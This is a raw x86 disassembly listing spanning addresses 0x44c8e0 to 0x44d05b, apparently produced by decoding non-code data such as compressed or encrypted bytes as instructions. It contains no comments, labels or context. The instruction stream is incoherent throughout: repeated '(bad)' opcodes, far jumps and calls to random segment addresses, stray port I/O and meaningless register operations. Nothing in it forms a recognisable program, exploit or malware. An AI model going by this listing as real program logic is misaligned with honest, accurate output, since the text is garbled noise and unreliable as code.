  44c8e0:	pop    edx
  44c8e1:	(bad)  
  44c8e2:	pop    ebx
  44c8e3:	aaa    
  44c8e4:	mov    DWORD PTR [edi],ebx
  44c8e6:	adc    BYTE PTR [edx],dh
  44c8e8:	stos   DWORD PTR es:[edi],eax
  44c8e9:	fst    QWORD PTR [edx+eiz*1]
  44c8ec:	jno    0x44c917
  44c8ee:	jmp    0xc93e:0xded6a21c
  44c8f5:	inc    eax
  44c8f6:	sub    edx,DWORD PTR [edx+0x11]
  44c8f9:	call   0xcd26cdf3
  44c8fe:	xor    BYTE PTR [ecx-0x5c95ef69],al
  44c904:	nop
  44c905:	loopne 0x44c92c
  44c907:	and    eax,0x966c1ebc
  44c90c:	clc    
  44c90d:	retf   0xaa3c
  44c910:	add    BYTE PTR [esi],bl
  44c912:	and    DWORD PTR [esi],eax
  44c914:	or     eax,esi
  44c916:	js     0x44c8bc
  44c918:	dec    ebp
  44c919:	or     eax,0x32e53a9f
  44c91e:	callw  0x6afb
  44c922:	inc    ebx
  44c923:	rol    BYTE PTR [ebx],0x78
  44c926:	repnz popf 
  44c928:	sub    DWORD PTR [eax],edi
  44c92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c92b:	aam    0x5
  44c92d:	mov    al,0xe
  44c92f:	fisttp WORD PTR [ecx-0x6b49fe1c]
  44c935:	jle    0x44c97f
  44c937:	pop    edx
  44c938:	js     0x44c9aa
  44c93a:	xchg   ebp,eax
  44c93b:	fdivrp st(0),st
  44c93d:	adc    eax,0xba6c280f
  44c942:	clc    
  44c943:	dec    ebx
  44c944:	cmp    ch,BYTE PTR [eax-0x726c3359]
  44c94a:	test   DWORD PTR [esi-0x1f11b7b9],eax
  44c950:	push   esi
  44c951:	stos   BYTE PTR es:[edi],al
  44c952:	jecxz  0x44c967
  44c954:	rcr    BYTE PTR [edx+0x6ffa4e42],1
  44c95a:	dec    eax
  44c95b:	xchg   edi,eax
  44c95c:	clc    
  44c95d:	jge    0x44c9aa
  44c95f:	cli    
  44c960:	dec    ecx
  44c961:	dec    edx
  44c962:	int    0xd1
  44c964:	scas   al,BYTE PTR es:[edi]
  44c965:	(bad)  
  44c966:	enter  0x861,0xc
  44c96a:	outs   dx,BYTE PTR ds:[esi]
  44c96b:	les    esi,FWORD PTR ds:[edi+0x78e00054]
  44c972:	adc    ch,BYTE PTR [eax+0x4352ec49]
  44c978:	push   0x4757be7a
  44c97d:	adc    BYTE PTR [ebx],bl
  44c97f:	mov    esi,0x17ec3f9e
  44c984:	repnz fs mov al,0xeb
  44c988:	dec    edx
  44c989:	les    edi,FWORD PTR [ecx+0x5f]
  44c98c:	jle    0x44c9eb
  44c98e:	pop    esp
  44c98f:	test   DWORD PTR [ebx+0xb],ebx
  44c992:	imul   ebp,eax,0xffffffa5
  44c995:	inc    edx
  44c996:	mov    WORD PTR [edx+eiz*2-0x3f],gs
  44c99a:	mov    eax,ds:0xab9e05f5
  44c99f:	or     BYTE PTR [edx+0x1a917636],ah
  44c9a5:	arpl   WORD PTR [esp],si
  44c9a8:	out    dx,al
  44c9a9:	shl    BYTE PTR [ebx-0x60faf284],0x36
  44c9b0:	jl     0x44c93c
  44c9b2:	xchg   esi,eax
  44c9b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c9b4:	cmp    DWORD PTR es:[eax],ebx
  44c9b7:	les    esi,FWORD PTR [ebx]
  44c9b9:	xor    BYTE PTR [eax+eiz*1+0x12e8056e],0xad
  44c9c1:	mov    dl,0x3
  44c9c3:	call   0x87ac2fe5
  44c9c8:	call   0x5f219a54
  44c9cd:	or     ah,BYTE PTR [ecx]
  44c9cf:	shl    eax,0x9c
  44c9d2:	xchg   edx,eax
  44c9d3:	cs add al,0x60
  44c9d6:	out    dx,eax
  44c9d7:	enter  0xf6a,0x5
  44c9db:	sbb    eax,0xe2ca68c2
  44c9e0:	les    edi,FWORD PTR ds:0xd0340f89
  44c9e6:	nop
  44c9e7:	data16 lods al,BYTE PTR ds:[esi]
  44c9e9:	test   al,0xfa
  44c9eb:	movhlps xmm3,xmm3
  44c9ee:	xor    DWORD PTR [eax],esp
  44c9f0:	dec    ebx
  44c9f1:	call   0x96a2:0xcda4681c
  44c9f8:	sar    BYTE PTR [ebx-0xa],0xca
  44c9fc:	mov    al,ds:0x136a27c7
  44ca01:	inc    edx
  44ca02:	ret    0xc7be
  44ca05:	cmc    
  44ca06:	pushf  
  44ca07:	mov    bl,0xb4
  44ca09:	jne    0x44ca26
  44ca0b:	mov    al,0x3b
  44ca0d:	cs lahf 
  44ca0f:	es mov esp,0xed1101e1
  44ca15:	jmp    0x1bf4:0x1149e8de
  44ca1c:	inc    esp
  44ca1d:	xchg   DWORD PTR [ecx+edx*4+0x4b4c05d0],ecx
  44ca24:	xchg   edx,eax
  44ca25:	loop   0x44ca2a
  44ca27:	sbb    al,al
  44ca29:	jb     0xaaa644c7
  44ca2f:	outs   dx,BYTE PTR ds:[esi]
  44ca30:	jecxz  0x44ca48
  44ca32:	scas   eax,DWORD PTR es:[edi]
  44ca33:	pusha  
  44ca34:	mov    al,ds:0xa4f13497
  44ca39:	sbb    eax,esi
  44ca3b:	out    0xfb,al
  44ca3d:	mov    cs,ebp
  44ca3f:	adc    BYTE PTR [edx],bl
  44ca41:	sahf   
  44ca42:	and    BYTE PTR [edx],dl
  44ca44:	cwde   
  44ca45:	cmp    DWORD PTR [edx+0x2f],ebp
  44ca48:	cmp    ch,BYTE PTR [ecx]
  44ca4a:	sbb    al,0x4b
  44ca4c:	xor    BYTE PTR [ebx],bl
  44ca4e:	mov    fs,WORD PTR [edx+0x20c8f4e8]
  44ca54:	push   edx
  44ca55:	sub    bh,BYTE PTR [ebp+0x2871203b]
  44ca5b:	stos   DWORD PTR es:[edi],eax
  44ca5c:	inc    ecx
  44ca5d:	nop
  44ca5e:	into   
  44ca5f:	clc    
  44ca60:	les    eax,FWORD PTR [ebx-0x2faadabc]
  44ca66:	mov    ecx,0xa8c8bb2e
  44ca6b:	(bad)  
  44ca6c:	rcr    DWORD PTR [eax+ebp*8+0x12],cl
  44ca70:	pushf  
  44ca71:	(bad)  
  44ca72:	jmp    0xb535:0xec1e061b
  44ca79:	dec    esp
  44ca7a:	jmp    0xfd3c:0xa3aab094
  44ca81:	or     al,0xac
  44ca83:	js     0x44ca5d
  44ca85:	and    eax,0x4f8930fa
  44ca8a:	mov    gs,WORD PTR [ecx]
  44ca8c:	add    DWORD PTR [eax],0xffffff8f
  44ca8f:	mov    ebx,0xa889875a
  44ca94:	js     0x44cac4
  44ca96:	inc    eax
  44ca97:	inc    ecx
  44ca98:	xchg   ch,al
  44ca9a:	pop    es
  44ca9b:	add    eax,eax
  44ca9d:	and    eax,DWORD PTR [ecx]
  44ca9f:	add    al,0xab
  44caa1:	in     eax,0xa8
  44caa3:	leave  
  44caa4:	or     eax,0xec1dc83c
  44caa9:	pop    eax
  44caaa:	xor    ebp,DWORD PTR [eax+0x7c]
  44caad:	and    dh,BYTE PTR [ebp-0x4f01c3e0]
  44cab3:	ret    0x5115
  44cab6:	push   esi
  44cab7:	daa    
  44cab8:	je     0x44ca98
  44caba:	add    dh,ah
  44cabc:	jge    0x44cb19
  44cabe:	ret    
  44cabf:	xor    eax,0xffffffc4
  44cac2:	push   eax
  44cac3:	fcom   QWORD PTR [eax+0x4c732681]
  44cac9:	popf   
  44caca:	out    0x3c,eax
  44cacc:	push   ebx
  44cacd:	ret    0xd546
  44cad0:	je     0x44caf6
  44cad2:	xor    cl,BYTE PTR [edx-0x5a]
  44cad5:	mov    ds:0x7814214a,eax
  44cada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cadb:	js     0x44cb4f
  44cadd:	ss cwde 
  44cadf:	test   DWORD PTR [esi+0xcf69668],ecx
  44cae5:	mov    ebx,ds
  44cae7:	mov    WORD PTR [edi+0x663012f5],?
  44caed:	ss jo  0x44cae4
  44caf0:	cmp    dl,BYTE PTR [eax]
  44caf2:	stos   DWORD PTR es:[edi],eax
  44caf3:	mov    BYTE PTR [edx+0x6b],al
  44caf6:	or     BYTE PTR [edx+edi*1+0x4c],al
  44cafa:	adc    al,0xca
  44cafc:	sahf   
  44cafd:	jo     0x44cabd
  44caff:	inc    edx
  44cb00:	xor    DWORD PTR [eax],ecx
  44cb02:	cld    
  44cb03:	nop
  44cb04:	xor    cl,bl
  44cb06:	out    dx,al
  44cb07:	jp     0x44cb23
  44cb09:	or     eax,0x471dadb
  44cb0e:	add    al,0x8e
  44cb10:	adc    DWORD PTR [edi-0x60],eax
  44cb13:	add    bh,BYTE PTR [ebx-0x49e87adb]
  44cb19:	int3   
  44cb1a:	(bad)  [eax+0x426b5098]
  44cb20:	lds    edi,FWORD PTR [edx+ebp*2-0x11d019dc]
  44cb27:	test   DWORD PTR [edx],esi
  44cb29:	mov    al,0xe0
  44cb2b:	fwait
  44cb2c:	jmp    0x4b6b:0x8f3724ff
  44cb33:	pop    ebx
  44cb34:	sti    
  44cb35:	pop    esp
  44cb36:	loopne 0x44cb42
  44cb38:	add    dh,BYTE PTR [esi+0x5e]
  44cb3b:	stc    
  44cb3c:	sbb    BYTE PTR [ecx],0x9b
  44cb3f:	add    bl,al
  44cb41:	add    eax,0x87b2d0c3
  44cb46:	xor    ecx,DWORD PTR [ecx+0x14]
  44cb49:	mov    al,0x0
  44cb4b:	rol    BYTE PTR [esi],cl
  44cb4d:	inc    esi
  44cb4e:	daa    
  44cb4f:	xchg   ecx,eax
  44cb50:	sahf   
  44cb51:	sub    BYTE PTR [edi+ebx*8-0x53dc1248],dh
  44cb58:	test   al,0xa6
  44cb5a:	xchg   edi,eax
  44cb5b:	rol    edx,0x26
  44cb5e:	xchg   esp,eax
  44cb5f:	xchg   esp,eax
  44cb60:	inc    eax
  44cb61:	pop    ds
  44cb62:	loope  0x44cb1e
  44cb64:	fist   WORD PTR [edx]
  44cb66:	push   ds
  44cb67:	xor    dh,0x84
  44cb6a:	jbe    0x44cb4e
  44cb6c:	sub    eax,0x1d14ee41
  44cb71:	fcmovu st,st(2)
  44cb73:	(bad)  
  44cb74:	jmp    0xff2bea1f
  44cb79:	adc    DWORD PTR [ecx-0x1724a7ea],edi
  44cb7f:	push   edx
  44cb80:	sub    BYTE PTR [eax-0x3c],bl
  44cb83:	pop    edx
  44cb84:	scas   eax,DWORD PTR es:[edi]
  44cb85:	add    dh,BYTE PTR [eax+0x29191682]
  44cb8b:	jp     0x44cbcb
  44cb8d:	jb     0x44cb25
  44cb8f:	xchg   DWORD PTR [ecx-0x70f5e0e3],eax
  44cb95:	mov    edx,0x90184c92
  44cb9a:	clc    
  44cb9b:	imul   ebp,ecx,0x75bc144d
  44cba1:	dec    esi
  44cba2:	and    eax,DWORD PTR [ecx]
  44cba4:	aad    0x6f
  44cba6:	test   al,0x64
  44cba8:	and    DWORD PTR [edx-0x30],eax
  44cbab:	test   BYTE PTR [eax-0x5f71f52c],0x46
  44cbb2:	shr    BYTE PTR [ebp-0x4e4ac564],cl
  44cbb8:	xor    eax,0xfbb86c1d
  44cbbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cbbe:	xchg   edi,eax
  44cbbf:	test   eax,0x68275a18
  44cbc4:	ret    
  44cbc5:	mov    esi,0x6e1130b6
  44cbca:	add    esi,ebp
  44cbcc:	push   es
  44cbcd:	jbe    0x44cc13
  44cbcf:	mov    ch,0x8a
  44cbd1:	push   cs
  44cbd2:	sub    BYTE PTR [esi],dh
  44cbd4:	fdivr  DWORD PTR [edx]
  44cbd6:	pusha  
  44cbd7:	hlt    
  44cbd8:	pop    eax
  44cbd9:	xchg   esi,eax
  44cbda:	mov    BYTE PTR [ecx],ah
  44cbdc:	or     al,0xa8
  44cbde:	ins    DWORD PTR es:[edi],dx
  44cbdf:	(bad)  
  44cbe0:	mov    ah,0x9c
  44cbe2:	cmp    esp,DWORD PTR [ebx+eax*8+0x10]
  44cbe6:	call   0x719fed74
  44cbeb:	pusha  
  44cbec:	aam    0xfe
  44cbee:	jl     0x44cbe3
  44cbf0:	leave  
  44cbf1:	pop    eax
  44cbf2:	fild   WORD PTR [edx]
  44cbf4:	mov    cl,0xc3
  44cbf6:	cmps   WORD PTR ss:[esi],WORD PTR es:[edi]
  44cbf9:	sbb    bh,BYTE PTR [esi-0x5871f436]
  44cbff:	lods   al,BYTE PTR ds:[esi]
  44cc00:	adc    cl,BYTE PTR [esi]
  44cc02:	mov    esi,0x247876d0
  44cc07:	push   edx
  44cc08:	jae    0x44cbb7
  44cc0a:	ret    
  44cc0b:	fadd   st,st(0)
  44cc0d:	inc    esi
  44cc0e:	mov    cl,dl
  44cc10:	paddw  mm2,QWORD PTR [esi]
  44cc13:	or     BYTE PTR [ebp+edx*2+0xe667e9c],bh
  44cc1a:	and    ah,al
  44cc1c:	push   ebx
  44cc1d:	dec    ebp
  44cc1e:	inc    edi
  44cc1f:	test   BYTE PTR [eax+0x10],0xa0
  44cc23:	bound  edi,QWORD PTR [ebx]
  44cc25:	mov    ah,0x85
  44cc27:	ret    0xd33a
  44cc2a:	mov    BYTE PTR [ecx],bh
  44cc2c:	fs jge 0x44cbb2
  44cc2f:	js     0x44cc71
  44cc31:	push   cs
  44cc32:	out    0x76,eax
  44cc34:	fs xchg esp,eax
  44cc36:	mov    eax,0x3a203805
  44cc3b:	in     al,dx
  44cc3c:	push   ecx
  44cc3d:	gs cwde 
  44cc3f:	inc    esp
  44cc40:	mov    eax,0x4c0f29d4
  44cc45:	mov    esp,0x2d7fbeb0
  44cc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cc4b:	sbb    DWORD PTR ds:0x59278907,edi
  44cc51:	mov    WORD PTR [ebp-0x20],?
  44cc54:	add    edx,DWORD PTR [esi]
  44cc56:	test   eax,0x9d505028
  44cc5b:	loop   0x44cc0b
  44cc5d:	add    bl,BYTE PTR ds:0x5e78db00
  44cc63:	adc    DWORD PTR [eax],esp
  44cc65:	pop    esp
  44cc66:	imul   DWORD PTR [eax+edx*4-0x60]
  44cc6a:	clc    
  44cc6b:	mov    eax,ds:0x93b442e7
  44cc70:	cmp    al,BYTE PTR [ecx-0x3b]
  44cc73:	adc    cl,BYTE PTR [esi+ebp*2+0x51ea8d10]
  44cc7a:	(bad)  
  44cc7b:	daa    
  44cc7c:	sbb    dl,cl
  44cc7e:	push   cs
  44cc7f:	xchg   esp,eax
  44cc80:	test   BYTE PTR [eax],dl
  44cc82:	(bad)
  44cc86:	jecxz  0x44cca6
  44cc88:	adc    bh,dl
  44cc8a:	mov    eax,edx
  44cc8c:	mov    al,BYTE PTR [ebx]
  44cc8e:	cli    
  44cc8f:	gs call 0x57b10dda
  44cc95:	adc    al,0xf1
  44cc97:	mov    cs,WORD PTR [ecx+0x63]
  44cc9a:	aam    0xa7
  44cc9c:	sub    ah,ah
  44cc9e:	loope  0x44cc25
  44cca0:	xchg   esi,eax
  44cca1:	aaa    
  44cca2:	sub    edi,ecx
  44cca4:	jp     0x44ccea
  44cca6:	and    BYTE PTR [eax+0x49],bh
  44cca9:	sbb    BYTE PTR [edx+eax*1],al
  44ccac:	popa   
  44ccad:	jle    0x44cca4
  44ccaf:	sub    DWORD PTR [eax-0x338c3d7e],0xffffffce
  44ccb6:	jge    0x44ccba
  44ccb8:	push   eax
  44ccb9:	test   BYTE PTR ds:0xd6f81eae,dh
  44ccbf:	sub    eax,DWORD PTR [eax]
  44ccc1:	push   0x1d5eaf3a
  44ccc6:	inc    edx
  44ccc7:	cmp    al,0x20
  44ccc9:	lock pop ebx
  44cccb:	or     dh,ah
  44cccd:	divps  xmm7,XMMWORD PTR [edi+0x3e]
  44ccd1:	sbb    bl,BYTE PTR [edx]
  44ccd3:	push   cs
  44ccd4:	dec    ecx
  44ccd5:	push   esp
  44ccd6:	inc    ebp
  44ccd7:	sahf   
  44ccd8:	jge    0x44cd00
  44ccda:	scas   eax,DWORD PTR es:[edi]
  44ccdb:	push   0xffffff92
  44ccdd:	mov    WORD PTR [edx+edx*2],es
  44cce0:	call   0x3824:0x330c1413
  44cce7:	scas   al,BYTE PTR es:[edi]
  44cce8:	add    DWORD PTR [eax-0x65e918eb],0xffffff8e
  44ccef:	pop    edx
  44ccf0:	or     ch,BYTE PTR [esp+eax*1-0x5215ba0c]
  44ccf7:	xlat   BYTE PTR ds:[ebx]
  44ccf8:	add    BYTE PTR [ebx-0x5a],al
  44ccfb:	lock sub DWORD PTR [eax],0x3fd4f86c
  44cd02:	sub    BYTE PTR [ecx+0x57],al
  44cd05:	push   ebp
  44cd06:	jnp    0x44cd4c
  44cd08:	aad    0x76
  44cd0a:	repnz test BYTE PTR [edx-0x68],0x4f
  44cd0f:	push   ds
  44cd10:	or     eax,DWORD PTR [edx]
  44cd12:	pop    ebx
  44cd13:	push   ecx
  44cd14:	pop    esp
  44cd15:	push   0x95a40a57
  44cd1a:	in     al,dx
  44cd1b:	jmp    0x317c:0x6b62013
  44cd22:	xor    ah,cl
  44cd24:	mov    ds:0xb426bd18,eax
  44cd29:	inc    edx
  44cd2a:	out    0xe2,al
  44cd2c:	mov    esi,0xa920f6b2
  44cd31:	push   ebp
  44cd32:	mov    cl,bh
  44cd34:	fsubr  st,st(4)
  44cd36:	mov    ecx,0xa707a210
  44cd3b:	clc    
  44cd3c:	or     eax,0x45c603e0
  44cd41:	jmp    0x23c4:0xd935db36
  44cd48:	or     ecx,DWORD PTR [esi]
  44cd4a:	and    dh,bh
  44cd4c:	mov    bh,cl
  44cd4e:	xor    bl,BYTE PTR [esi]
  44cd50:	mov    esi,0xfa0aecae
  44cd55:	mov    ebx,0xb5c76d19
  44cd5a:	add    al,0x1
  44cd5c:	adc    ah,BYTE PTR [edi+0xa1ec4b2]
  44cd62:	les    ecx,FWORD PTR [esi+0x4ea62443]
  44cd68:	adc    DWORD PTR [ebx],ebx
  44cd6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cd6b:	mov    ebp,ds
  44cd6d:	rcl    BYTE PTR [esp+edi*4-0x2e3bcce6],0x9a
  44cd75:	inc    edx
  44cd76:	(bad)  
  44cd77:	sahf   
  44cd78:	sub    dl,dh
  44cd7a:	(bad)  
  44cd7b:	pop    esi
  44cd7c:	dec    edx
  44cd7d:	or     BYTE PTR [ecx+edx*2],cl
  44cd80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cd81:	rcr    BYTE PTR [ecx+0x14fb083e],cl
  44cd87:	mov    WORD PTR [esi],gs
  44cd89:	nop
  44cd8a:	(bad)  
  44cd8b:	lods   al,BYTE PTR ds:[esi]
  44cd8c:	push   esi
  44cd8d:	cli    
  44cd8e:	aad    0x14
  44cd90:	push   eax
  44cd91:	inc    ebx
  44cd92:	vmovhps xmm0,xmm6,QWORD PTR [eax-0x74c112d2]
  44cd9a:	inc    esp
  44cd9b:	and    DWORD PTR [eax+eax*2+0x26646c9a],eax
  44cda2:	icebp  
  44cda3:	(bad)  [eax]
  44cda5:	mov    esp,0x680090c8
  44cdaa:	stos   BYTE PTR es:[edi],al
  44cdab:	cmp    BYTE PTR [esi+0x16393afb],dh
  44cdb1:	mov    ecx,0x356c1f46
  44cdb6:	mov    al,0xe2
  44cdb8:	mov    esi,0x7e57f7f8
  44cdbd:	xchg   edx,eax
  44cdbe:	inc    esp
  44cdbf:	rcl    DWORD PTR [edi],0x72
  44cdc2:	jle    0x44cd53
  44cdc4:	cwde   
  44cdc5:	sbb    eax,0xd7456c73
  44cdca:	sub    BYTE PTR [eax-0x65e43d4f],0x3d
  44cdd1:	add    BYTE PTR [ebp-0x3d],0x11
  44cdd5:	and    BYTE PTR [esi+ebx*2],ch
  44cdd8:	push   eax
  44cdd9:	sub    eax,0xc1ed1fa
  44cdde:	bound  esp,QWORD PTR [ecx+0x64c9a03c]
  44cde4:	sub    eax,0x2a248bf0
  44cde9:	pop    edx
  44cdea:	or     al,0x3c
  44cdec:	and    DWORD PTR [edx-0x5c],eax
  44cdef:	mov    DWORD PTR [edi-0x7d55bff0],ebx
  44cdf5:	bound  esp,QWORD PTR [edx+0x2e8e3ae9]
  44cdfb:	or     dl,0x75
  44cdfe:	or     al,0xd6
  44ce00:	push   ds
  44ce01:	sbb    BYTE PTR ds:0x947bbd06,0x6e
  44ce08:	adc    cl,bh
  44ce0a:	lods   al,BYTE PTR ds:[esi]
  44ce0b:	push   ebx
  44ce0c:	loopne 0x44cdcf
  44ce0e:	(bad)  
  44ce0f:	lea    esp,[edi-0x1de56b4a]
  44ce15:	xor    BYTE PTR [ebp+0x7c0179a0],0x0
  44ce1c:	mov    dh,BYTE PTR [esi]
  44ce1e:	mov    ds:0x6b59acb4,al
  44ce23:	inc    ebx
  44ce24:	js     0x44ce2a
  44ce26:	push   es
  44ce27:	(bad)  
  44ce28:	lock adc al,dl
  44ce2b:	or     esi,DWORD PTR [ebx+esi*8+0x31]
  44ce2f:	call   0xae927668
  44ce34:	lahf   
  44ce35:	xchg   esp,eax
  44ce36:	mov    BYTE PTR [edx],cl
  44ce38:	(bad)  
  44ce39:	out    0x3a,al
  44ce3b:	xor    al,BYTE PTR [ebx]
  44ce3d:	cwde   
  44ce3e:	clc    
  44ce3f:	lods   al,BYTE PTR ds:[esi]
  44ce40:	xor    al,0x2
  44ce42:	jae    0x44ce3d
  44ce44:	push   esi
  44ce45:	or     eax,0x8cd25e80
  44ce4a:	in     eax,0x5c
  44ce4c:	mov    esi,0x4e0db570
  44ce51:	or     esi,DWORD PTR [esi]
  44ce53:	push   cs
  44ce54:	shr    dh,1
  44ce56:	xchg   esp,eax
  44ce57:	ja     0x44ce85
  44ce59:	loop   0x44ce80
  44ce5b:	push   esp
  44ce5c:	push   es
  44ce5d:	add    al,0x66
  44ce5f:	xchg   ecx,eax
  44ce60:	mov    al,ds:0x7ac2d6b5
  44ce65:	inc    eax
  44ce66:	test   eax,0x88e2274c
  44ce6b:	pop    edx
  44ce6c:	cli    
  44ce6d:	xchg   edi,eax
  44ce6e:	jge    0x44cea0
  44ce70:	add    BYTE PTR [edx-0x12],bl
  44ce73:	imul   eax
  44ce75:	out    0x6d,al
  44ce77:	pop    ebp
  44ce78:	add    bl,BYTE PTR [ebx+0x53]
  44ce7b:	xchg   esp,eax
  44ce7c:	repnz neg BYTE PTR [esi-0x12]
  44ce80:	xor    BYTE PTR ds:0x34d4b9a3,0xc2
  44ce87:	js     0x44ce25
  44ce89:	ds adc al,0x3e
  44ce8c:	dec    ecx
  44ce8d:	test   al,0x2
  44ce8f:	fdivr  st,st(0)
  44ce91:	mov    esp,0x26a8518
  44ce96:	(bad)  
  44ce98:	aad    0x38
  44ce9a:	and    esi,DWORD PTR [edx]
  44ce9c:	pop    edx
  44ce9d:	aad    0x23
  44ce9f:	pushf  
  44cea0:	lods   al,BYTE PTR ds:[esi]
  44cea1:	nop
  44cea2:	scas   al,BYTE PTR es:[edi]
  44cea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cea4:	cmp    al,0x26
  44cea6:	xchg   dh,dl
  44cea8:	xchg   BYTE PTR [ebp+0x7a027738],al
  44ceae:	or     ecx,esp
  44ceb0:	push   edx
  44ceb1:	and    al,0x3
  44ceb3:	cli    
  44ceb4:	and    cl,BYTE PTR [eax+0x501e8a6a]
  44ceba:	sahf   
  44cebb:	or     ah,BYTE PTR [ebx+0x2]
  44cebe:	in     eax,0x67
  44cec0:	in     eax,dx
  44cec1:	xor    eax,0x583008f5
  44cec6:	imul   ecx,DWORD PTR [eax+0x4b],0x5e
  44ceca:	hlt    
  44cecb:	push   ebp
  44cecc:	inc    edx
  44cecd:	adc    al,0x7a
  44cecf:	inc    edx
  44ced0:	cdq    
  44ced1:	inc    edx
  44ced2:	sbb    ch,cl
  44ced4:	and    eax,0x5e1d82e0
  44ced9:	mov    es,WORD PTR [ebp-0x5e]
  44cedc:	xor    eax,0x261e4609
  44cee1:	push   edi
  44cee2:	call   0xf5032b4
  44cee7:	ins    DWORD PTR es:[edi],dx
  44cee8:	fdivr  DWORD PTR ds:0xed893866
  44ceee:	or     al,al
  44cef0:	xchg   esp,eax
  44cef1:	test   DWORD PTR [eax-0x6102119c],0xa43a6f34
  44cefb:	dec    esp
  44cefc:	adc    ebp,DWORD PTR [ebx+edx*4-0x4ac1ffdd]
  44cf03:	inc    esp
  44cf04:	test   eax,0xc5b4527
  44cf09:	sbb    al,0xf8
  44cf0b:	add    al,0x50
  44cf0d:	xor    al,0xdf
  44cf0f:	jl     0x44ce93
  44cf11:	fs pop ss
  44cf13:	fisub  DWORD PTR ds:0xfa5cde90
  44cf19:	sbb    eax,0x3f09914c
  44cf1e:	sub    DWORD PTR [ebp-0x2de1a76c],esi
  44cf24:	pop    ecx
  44cf25:	jbe    0x44cf56
  44cf27:	sbb    bh,BYTE PTR [eax+0x8]
  44cf2a:	push   esp
  44cf2b:	(bad)  
  44cf2c:	push   0xffffffd0
  44cf2e:	mov    eax,ds:0xa9b522a4
  44cf33:	mov    al,ds:0x64925c0d
  44cf38:	mov    WORD PTR [esi+0x25],?
  44cf3b:	jmp    0x58bd5d66
  44cf40:	retf   0x4719
  44cf43:	and    BYTE PTR [edx-0x79],bl
  44cf46:	push   esi
  44cf47:	outs   dx,BYTE PTR ds:[esi]
  44cf48:	les    ebp,FWORD PTR [ebp-0x4]
  44cf4b:	lea    esp,[edx+0x6e8b460a]
  44cf51:	and    esi,ecx
  44cf53:	rcr    bl,cl
  44cf55:	dec    esp
  44cf56:	jnp    0x44cfa1
  44cf58:	mov    eax,ds:0x693e5ec4
  44cf5d:	sub    DWORD PTR [eax],edx
  44cf5f:	aas    
  44cf60:	add    al,dh
  44cf62:	(bad)  
  44cf63:	ror    BYTE PTR [edx+ebp*8+0x38],1
  44cf67:	popa   
  44cf68:	inc    eax
  44cf69:	mov    BYTE PTR [edi+eax*1],ah
  44cf6c:	mov    DWORD PTR [edx],esp
  44cf6e:	call   0xb5c30f19
  44cf73:	loopne 0x44cf79
  44cf75:	jle    0x44cfb9
  44cf77:	in     eax,dx
  44cf78:	in     al,dx
  44cf79:	aam    0xe2
  44cf7b:	jb     0x44cf1b
  44cf7d:	xchg   ebp,eax
  44cf7e:	jge    0x44cfd0
  44cf80:	or     ebx,esp
  44cf82:	mov    esp,esi
  44cf84:	ret    
  44cf85:	ds (bad) 
  44cf87:	sbb    eax,0xa4240f81
  44cf8c:	adc    bh,BYTE PTR [ecx]
  44cf8e:	out    0x33,al
  44cf90:	aad    0x9a
  44cf92:	inc    ecx
  44cf93:	sbb    al,BYTE PTR [ecx+0x1016d8e8]
  44cf99:	lock retf 
  44cf9b:	push   esp
  44cf9c:	(bad)  
  44cf9d:	mov    esp,0x11279a74
  44cfa2:	js     0x44cf33
  44cfa4:	rcl    bl,0x70
  44cfa7:	mov    bh,0xd4
  44cfa9:	hlt    
  44cfaa:	rcl    DWORD PTR [esi],cl
  44cfac:	mov    dh,0xba
  44cfae:	jo     0x44cf86
  44cfb0:	loopne 0x44cfc8
  44cfb2:	xchg   esi,eax
  44cfb3:	fsubr  QWORD PTR [edi-0x625bcad3]
  44cfb9:	adc    al,0x1a
  44cfbb:	pusha  
  44cfbc:	pop    ebp
  44cfbd:	xor    eax,0xe40a5811
  44cfc2:	adc    al,0x1e
  44cfc4:	daa    
  44cfc5:	mov    al,ds:0x855e61d6
  44cfca:	push   edx
  44cfcb:	dec    eax
  44cfcc:	dec    eax
  44cfcd:	pop    ebx
  44cfce:	clc    
  44cfcf:	sub    eax,0xc8d80be0
  44cfd4:	ror    bh,0xb2
  44cfd7:	xchg   DWORD PTR [eax],edx
  44cfd9:	push   ds
  44cfda:	xchg   edx,eax
  44cfdb:	jns    0x44cffe
  44cfdd:	sub    ch,BYTE PTR [edi]
  44cfdf:	popf   
  44cfe0:	jo     0x44cf7b
  44cfe2:	push   esp
  44cfe3:	push   eax
  44cfe4:	icebp  
  44cfe5:	into   
  44cfe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cfe7:	mov    DWORD PTR [eax],0x2238d615
  44cfed:	push   eax
  44cfee:	mov    al,0x8e
  44cff0:	and    DWORD PTR [ebx],edi
  44cff2:	push   esp
  44cff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cff4:	dec    eax
  44cff5:	pop    ds
  44cff6:	test   al,0x12
  44cff8:	jo     0x44cf84
  44cffa:	loop   0x44cf9c
  44cffc:	aaa    
  44cffd:	xchg   ebx,eax
  44cffe:	ret    0x44f6
  44d001:	jl     0x44cff0
  44d003:	sbb    al,0xed
  44d005:	pop    edi
  44d006:	or     eax,0xf4f0228f
  44d00b:	push   0x50b72863
  44d010:	fild   QWORD PTR [ecx+eax*2]
  44d013:	or     BYTE PTR [edx],dl
  44d015:	xchg   esp,eax
  44d016:	adc    BYTE PTR [esi+ecx*2-0x7f3f3f40],dh
  44d01d:	mov    eax,0x2d97f0fc
  44d022:	push   esp
  44d023:	mov    DWORD PTR [edx+0x36],esi
  44d026:	add    dh,BYTE PTR [esi]
  44d028:	call   0xfa0:0x84ccc6d8
  44d02f:	mov    esp,0x526b5a14
  44d034:	jo     0x44d046
  44d036:	pop    ecx
  44d037:	xchg   esp,eax
  44d038:	xor    al,0x3b
  44d03b:	xor    BYTE PTR [edi],ah
  44d03d:	push   eax
  44d03e:	clc    
  44d03f:	or     al,0xa6
  44d041:	mov    ebx,0xd697d42b
  44d046:	and    BYTE PTR [edx-0x6ff6f11a],0x61
  44d04d:	cdq    
  44d04e:	jmp    0x843:0x53626cf4
  44d055:	mov    BYTE PTR [edi+0x78],dh
  44d058:	push   0xffffffa8
  44d05a:	push   ss
  44d05b:	cmc    
